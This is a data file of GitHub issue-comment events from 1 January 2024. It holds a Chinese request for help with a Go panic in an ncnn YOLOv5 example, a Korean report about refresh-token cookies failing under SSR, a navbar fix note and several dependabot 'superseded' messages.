+34500360566,IssueCommentEvent,2024-01-01T11:00:14Z,Esword618,jinzhongmin/goncnn-examples,1.0,created,"下面是我用yolov5训练的模型，但是我在使pnnx转化为ncnn的模型后，使用你的yolov5s-exmple的例程调用我的模型进行识别，发现有报错，大佬可以帮忙看看吗，这个对于我有点难度，不知道怎么入手。
+下面是报错：
+```
+panic: runtime error: slice bounds out of range [:2008210] with capacity 277200
+
+goroutine 66 [running]:
+main.main.func1(0xc2e87c?, 0x6270)
+        E:/goproject/src/goncnn-examples/defect-identification/main.go:99 +0x288
+github.com/anthonynsimon/bild/parallel.Line.func1()
+        E:/goproject/src/pkg/mod/github.com/anthonynsimon/bild@v0.13.0/parallel/parallel.go:33 +0x55
+created by github.com/anthonynsimon/bild/parallel.Line in goroutine 1
+        E:/goproject/src/pkg/mod/github.com/anthonynsimon/bild@v0.13.0/parallel/parallel.go:31 +0xa5
+panic: runtime error: slice bounds out of range [:1472710] with capacity 277200
+```
+[defect-identification.zip](https://github.com/jinzhongmin/goncnn-examples/files/13804288/defect-identification.zip)
+"
+34500360732,IssueCommentEvent,2024-01-01T11:00:15Z,moa1128,oneMonthProject/Front,103.0,created,"Refresh token 을 재발급 하는 api 는 실행되지만 Cookie header 에 null 이 들어감 (원래는 현재 존재하는 쿠키를 브라우저가 Cookie 로 전달)
+header 에 Cookie 를 따로 설정해주면 들어가지만 Set-Cookie 로 다시 설정해준 Refresh token 이 브라우저 쿠키에 저장되지 않음
+위와 같은 현상은 SSR 에서만 발생.. 로그인 처럼 SSR 로 구현하지 않았을 때에는 Request Cookie header 와 Response Set-Cookie 에 잘 들어가고 브라우저 쿠키에도 잘 저장이 됨"
+34500360761,IssueCommentEvent,2024-01-01T11:00:15Z,dependabot[bot],mliradelc/opencast,1163.0,created,Superseded by #1197.
+34500360853,IssueCommentEvent,2024-01-01T11:00:16Z,dependabot[bot],cooldev900/chrome-extension-for-textnow,26.0,created,Superseded by #38.
+34500361002,IssueCommentEvent,2024-01-01T11:00:17Z,Tymnspayce,The-MindSpace/MindSpace-Web,11.0,created,"Just Fixed the Navbar List item order in dashboard webpage and many more items.
+
+![image](https://github.com/The-MindSpace/MindSpace-Web/assets/138722584/6780af9d-19e4-446e-826e-06c6ccd54f50)
+
+"
+34500361090,IssueCommentEvent,2024-01-01T11:00:17Z,dependabot[bot],joffrey-bion/kotlin-blueprintjs,70.0,created,Superseded by #71.
+34500361099,IssueCommentEvent,2024-01-01T11:00:17Z,dependabot[bot],gear-foundation/dapps,187.0,created,"Looks like these dependencies are updatable in another way, so this is no longer needed."
+34500361184,IssueCommentEvent,2024-01-01T11:00:18Z,dependabot[bot],libp2p/js-libp2p-delegated-content-routing,169.0,created,Superseded by #175.
